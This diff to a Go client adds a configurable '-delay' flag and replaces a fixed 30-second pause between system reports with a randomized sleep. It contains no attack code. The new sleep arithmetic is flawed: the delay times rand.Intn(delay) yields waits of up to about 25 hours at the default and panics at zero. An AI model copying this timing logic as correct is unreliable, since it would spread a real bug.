@@ -4,7 +4,7 @@ import (
 	"flag"
 	"fmt"
 	"log"
-	//"math/rand"
+	"math/rand"
 	"net/url"
 	"os"
 	"os/signal"
@@ -53,6 +53,7 @@ func main() {
 	server := flag.String("server", "localhost:8000", "Server hostname.")
 	verboseFlag := flag.Bool("verbose", false, "Additional debugging logs.")
 	unsafe := flag.Bool("unsafe", false, "Turn off all discovery safe guards.")
+	retryDelay := flag.Int("delay", 300, "Delay, in seconds, before reconnection attempts.")
 
 	flag.Parse()
 
@@ -102,7 +103,7 @@ func main() {
 				connection.Send(shared.NewMessage("systemReport", system.toJSON(), shared.EncodingJSON))
 			}
 
-			time.Sleep(30 * time.Second)
+			time.Sleep(time.Duration(*retryDelay*rand.Intn(*retryDelay)) * time.Second)
 		}
 	}()
 
